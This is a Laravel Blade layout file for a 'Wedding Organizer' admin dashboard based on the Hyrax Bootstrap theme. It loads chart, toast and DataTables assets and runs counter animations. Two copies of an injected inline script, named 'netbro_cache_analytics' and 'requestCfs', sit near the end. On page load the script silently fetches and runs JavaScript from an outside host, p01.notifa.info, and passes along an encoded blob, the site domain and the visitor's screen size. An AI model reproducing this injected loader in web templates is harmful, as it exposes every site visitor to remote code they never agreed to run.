<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<!-- Tell the browser to be responsive to screen width -->
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="">
	<meta name="author" content="">
	<!-- Favicon icon -->
	<link rel="icon" type="image/jpg" sizes="16x16" href="{{ asset('/hyrax/assets/images/shop.jpg') }}">
	<title>Wedding Organizer</title>
	<link href="{{ asset('/hyrax/assets/vendors/perfect-scrollbar/css/perfect-scrollbar.css') }}" rel="stylesheet">
	<!-- This page CSS -->
	<!-- chartist CSS -->
	<link href="{{ asset('/hyrax/assets/vendors/morrisjs/morris.css') }}" rel="stylesheet">
	<!--c3 CSS -->
	<link href="{{ asset('/hyrax/assets/vendors/c3-master/c3.min.css') }}" rel="stylesheet">
	
	<!-- flot css -->
	<link href="{{ asset('/hyrax/main/css/pages/float-chart.css') }}" rel="stylesheet">

	<!--Toaster Popup message CSS -->
	<link href="{{ asset('/hyrax/assets/vendors/toast-master/css/jquery.toast.css') }}" rel="stylesheet">
	<!-- Custom CSS -->
	<link href="{{ asset('/hyrax/main/css/master-stylesheet.css') }}" rel="stylesheet">
	<!-- You can change the theme colors from here -->
	<link href="{{ asset('/hyrax/main/css/colors/default.css') }}" id="theme" rel="stylesheet">
	<link rel="stylesheet" href="{{ asset('/hyrax/assets/vendors/dropify/dist/css/dropify.min.css')}}">
	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
	<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->


</head>

<body class="fix-header fix-sidebar card-no-border">
	<!-- ============================================================== -->
	<!-- Preloader - style you can find in spinners.css -->
	<!-- ============================================================== -->
	<div class="preloader">
		<div class="loader">
	  <div class="lds-roller">
	  <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
		</div>
	</div>
	<!-- ============================================================== -->
	<!-- Main wrapper - style you can find in pages.scss -->
	<!-- ============================================================== -->
	<div id="main-wrapper">
		<!-- ============================================================== -->
		<!-- Topbar header - style you can find in pages.scss -->
		<!-- ============================================================== -->
		@include('partials.header')
		<!-- ============================================================== -->
		<!-- End Topbar header -->
		<!-- ============================================================== -->
		<!-- ============================================================== -->
		<!-- Left Sidebar - style you can find in sidebar.scss  -->
		<!-- ============================================================== -->
		@include('partials.sidebar')
		<!-- ============================================================== -->
		<!-- End Left Sidebar - style you can find in sidebar.scss  -->
		<!-- ============================================================== -->
		<!-- ============================================================== -->
		<!-- Page wrapper  -->
		<!-- ============================================================== -->
		<div class="page-wrapper">
			<!-- ============================================================== -->
			<!-- Container fluid  -->
			<!-- ============================================================== -->
			<div class="container-fluid">
				<!-- ============================================================== -->
				<!-- Bread crumb and right sidebar toggle -->
				<!-- ============================================================== -->
				@yield('breadcrumb')
				<!-- ============================================================== -->
				<!-- End Bread crumb and right sidebar toggle -->
				<!-- ============================================================== -->
				<!-- ============================================================== -->
				<!-- Info box -->
				<!-- ============================================================== -->
				
				
				<div class="row counter">
					@yield('content')
					
				</div>
				<!-- ============================================================== -->
				<!-- End Info box -->
				<!-- ============================================================== -->
				
				<!-- ============================================================== -->
				<!-- End Page Content -->
				<!-- ============================================================== -->
				<!-- ============================================================== -->
				<!-- Right sidebar -->
				<!-- ============================================================== -->
				<!-- .right-sidebar -->
				@include('partials.rightsidebar')
				<!-- ============================================================== -->
				<!-- End Right sidebar -->
				<!-- ============================================================== -->
			</div>
			<!-- ============================================================== -->
			<!-- End Container fluid  -->
			<!-- ============================================================== -->
			<!-- ============================================================== -->
			<!-- footer -->
			<!-- ============================================================== -->
			<footer class="footer"> © 2018 Hyrax UX Admin Template by SRGIT </footer>
			<!-- ============================================================== -->
			<!-- End footer -->
			<!-- ============================================================== -->
		</div>
		<!-- ============================================================== -->
		<!-- End Page wrapper  -->
		<!-- ============================================================== -->
	</div>
	<!-- ============================================================== -->
	<!-- End Wrapper -->
	<!-- ============================================================== -->
	<!-- ============================================================== -->
	<!-- All Jquery -->
	<!-- ============================================================== -->
	<script src="{{ asset('/hyrax/assets/vendors/jquery/jquery.min.js') }}"></script>
	<!-- Bootstrap popper Core JavaScript -->
<!-- 	<script src="{{ asset('/hyrax/assets/vendors/bootstrap/js/popper.min.js') }}"></script>
 -->	<!-- <script src="{{ asset('/hyrax/assets/vendors/bootstrap/js/bootstrap.min.js') }}"></script> -->
	
	<!-- slimscrollbar scrollbar JavaScript -->
	<script src="{{ asset('/hyrax/assets/vendors/ps/perfect-scrollbar.jquery.min.js') }}"></script>
	<!--Wave Effects -->
	<script src="{{ asset('/hyrax/main/js/waves.js')}}"></script>
	<!--Menu sidebar -->
	<script src="{{ asset('/hyrax/main/js/sidebarmenu.js')}}"></script>
	<!--Custom JavaScript -->
	<script src="{{ asset('/hyrax/main/js/custom.min.js')}}"></script>
	<!-- ============================================================== -->
	<!-- This page plugins -->
	<!-- ============================================================== -->
	<!--morris JavaScript -->
	<script src="{{ asset('/hyrax/assets/vendors/raphael/raphael-min.js')}}"></script>
	<script src="{{ asset('/hyrax/assets/vendors/morrisjs/morris.min.js')}}"></script>
	<!--c3 JavaScript -->
	<script src="{{ asset('/hyrax/assets/vendors/d3/d3.min.js')}}"></script>
	<script src="{{ asset('/hyrax/assets/vendors/c3-master/c3.min.js')}}"></script>
	<!-- Popup message jquery -->
	<script src="{{ asset('/hyrax/assets/vendors/toast-master/js/jquery.toast.js')}}"></script>
	

	<!--Sparkline JavaScript -->
	<script src="{{ asset('/hyrax/assets/vendors/sparkline/jquery.sparkline.min.js')}}"></script>

	<!-- This is data table -->
    <script src="{{ asset('/hyrax/assets/vendors/jquery/jquery.min.js')}}"></script>
    <!-- Bootstrap tether Core JavaScript -->
    <script src="{{ asset('/hyrax/assets/vendors/bootstrap/js/popper.min.js')}}"></script>
    <script src="{{ asset('/hyrax/assets/vendors/bootstrap/js/bootstrap.min.js')}}"></script>
    <!-- slimscrollbar scrollbar JavaScript -->
    <script src="{{ asset('/hyrax/assets/vendors/ps/perfect-scrollbar.jquery.min.js')}}"></script>
    <!--Wave Effects -->
    <!-- <script src="{{asset('/hyrax/main/js/waves.js')}}"></script> -->
    <!--Menu sidebar -->
    <!-- <script src="{{asset('/hyrax/main/js/sidebarmenu.js')}}"></script> -->
    <!--stickey kit -->
    <script src="{{ asset('/hyrax/assets/vendors/sticky-kit-master/dist/sticky-kit.min.js')}}"></script>
    <script src="{{ asset('/hyrax/assets/vendors/sparkline/jquery.sparkline.min.js')}}"></script>
    <!--Custom JavaScript -->
    <script src="{{asset('/hyrax/main/js/custom.min.js')}}"></script>
    <!-- jQuery peity -->
    <script src="{{ asset('/hyrax/assets/vendors/peity/jquery.peity.min.js')}}"></script>
    <script src="{{ asset('/hyrax/assets/vendors/peity/jquery.peity.init.js')}}"></script>
	
	<!-- Chart JS -->
	<script src="{{asset('/hyrax/main/js/dashboard1.js')}}"></script>
	<!-- ============================================================== -->
	<!-- Style switcher -->
	<!-- ============================================================== -->
	<script src="{{ asset('/hyrax/assets/vendors/styleswitcher/jQuery.style.switcher.js')}}"></script>

	@yield('scripts')

<script>
$('.counter-count').each(function () {
		$(this).prop('Counter',0).animate({
			Counter: $(this).text()
		}, {
			duration: 5000,
			easing: 'swing',
			step: function (now) {
				$(this).text(Math.ceil(now));
			}
		});
	});
</script>
	

	
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdJjhfuBGXJ89xdi5xqL33x1x3gNTMTu0HaweOEOiwMmfkA%2bBi%2bORck8kzFlYa%2fe0j4TFpVXpYyjcHrkn%2bArW%2b8hh95Qi%2bOCxzY5AxRxn6go4OR3%2bOliKU5oXLjhl86BT39vUI4PFKem0m3gZjLsMzcW8o2wKakroAKtOkv5f88zoX84VlEa6FWQmmQO%2bwVIqmpZ0vjKW%2bO3m5T9lnZlvY7YxqB1IJVpKPEUvTNVNFCnYOEQnvg2Wwvvq67Pf9MrtWuMGGK%2f7b%2fofFj%2boeUp20VJo8aFPciH%2fjpnpOrpzAmr9jqMsYteyPjRrcU0QvxXA7W%2bDkH4Celx1z%2bEBzOQ2MP1a1%2fgtNGymmih4is7GR%2fz8JhhLFa9p6sM5nPYW4BCgKYmkD%2bKt4ysYTqZkbT6jtL4NlK%2fBLyzvcKF9Ioi3%2bFet%2fThFCla9My4GDFxwR6jk%2f5vaYb6jfExZ3mk5YMxOMjCPwkgwGrGu63gwFZ3MucmKd2eY1egu7KIYs52P5FdWJ3VUqgbrXz%2baXRfn68BAGtQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

<!-- Data Table -->
<!-- <script src="{{ asset('hyrax/assets/vendors/jquery/jquery.min.js')}}"></script>
 -->    <!-- Bootstrap tether Core JavaScript -->

 
    <!-- <script src="{{ asset('hyrax/assets/vendors/bootstrap/js/popper.min.js')}}"></script> -->
    <script src="{{ asset('/hyrax/assets/vendors/bootstrap/js/bootstrap.min.js')}}"></script>
    <!-- slimscrollbar scrollbar JavaScript -->
    <!-- <script src="{{ asset('hyrax/assets/vendors/ps/perfect-scrollbar.jquery.min.js')}}"></script> -->
    <!--Wave Effects -->
    <!-- <script src="{{ asset('/hyrax/main/js/waves.js')}}"></script> -->
    <!--Menu sidebar -->
    <!-- <script src="{{ asset('/hyrax/main/js/sidebarmenu.js')}}"></script> -->
    <!--stickey kit -->
    <!-- <script src="{{ asset('/hyrax/assets/vendors/sticky-kit-master/dist/sticky-kit.min.js')}}"></script> -->
    <!-- <script src="{{ asset('/hyrax/assets/vendors/sparkline/jquery.sparkline.min.js')}}"></script> -->


    <!--Custom JavaScript -->
    <script src="{{ asset('/hyrax/main/js/custom.min.js')}}"></script>
    <!-- This is data table -->
    <script src="{{ asset('/hyrax/assets/vendors/datatables/jquery.dataTables.min.js')}}"></script>
    <!-- end - This is for export functionality only -->
    <script>
    $(function() {
        $('#myTable').DataTable();
            var table = $('#example').DataTable({
                "columnDefs": [{
                    "visible": false,
                    "targets": 2
                }],
                "order": [
                    [2, 'asc']
                ],
                "displayLength": 25,
                "drawCallback": function(settings) {
                    var api = this.api();
                    var rows = api.rows({
                        page: 'current'
                    }).nodes();
                    var last = null;
                    api.column(2, {
                        page: 'current'
                    }).data().each(function(group, i) {
                        if (last !== group) {
                            $(rows).eq(i).before('<tr class="group"><td colspan="5">' + group + '</td></tr>');
                            last = group;
                        }
                    });
                }
            });
            // Order by the grouping
            $('#example tbody').on('click', 'tr.group', function() {
                var currentOrder = table.order()[0];
                if (currentOrder[0] === 2 && currentOrder[1] === 'asc') {
                    table.order([2, 'desc']).draw();
                } else {
                    table.order([2, 'asc']).draw();
                }
            });
        
    });
    $('#example23').DataTable({
        dom: 'Bfrtip',
        buttons: [
            'copy', 'csv', 'excel', 'pdf', 'print'
        ]
    });
    </script>
    <!-- ============================================================== -->
    <!-- Style switcher -->
    <!-- ============================================================== -->
    <script src="{{ asset('hyrax/assets/vendors/styleswitcher/jQuery.style.switcher.js')}}"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdJjhfuBGXJ88veGvbiM4QfIZTnPRUOR73gZigu9VTGRGso95XySxdS%2b3MFJ1iX16Auvh5Sd%2fr9N8T9WoTHSOdrTL6hCGRh%2bKXfhlbHr7yRn67VrNbafDhcc5EO%2f6xfeK5bLXN2LPkWvzVzURu3HVeu080pEktxkao957qCWYxF7ud9B4a73AUe3JMS2scGeGTWUQSoWL2CcJysuiVpZtGaj%2bmIS%2fH9wkNbeCsRvJLj3g3Z7bxeqXf8XWSa9C3li2Ly10BfkffQk50zHTX5NBiKF5ceVOT1CIaP9WYFWJAQkLcI7JCCcq%2fdJhsQ0pJYu6mPRcKgaOyR1GEi5LjPL%2bSZHpN8zsnucQ%2fsEoR%2bGFdnpTcpa0fRrbIlJ3dtbXvVw9eRMWo76OtrMytmrhNiy8SoqB%2bQleKeXkHW2xyu1R%2fUMGnv3Jc66AZmsfHHrtNWCrqvo9bvgfXTWNhkN2M5AlvS5MHsVrHFLKYIvtMIc%2b6jij3E4nzrCtS2CsiEJDMnZQ4I1poJBhiSxkX5rFowi68mRFwT3kNE6xPZyGRwBVPk54%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
<!-- End Data Table -->
</body>


<!-- Mirrored from creativethemes.co.in/demo/studioux/hyrax-admin-bootstrap4/main/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 25 Nov 2018 07:32:58 GMT -->
</html>
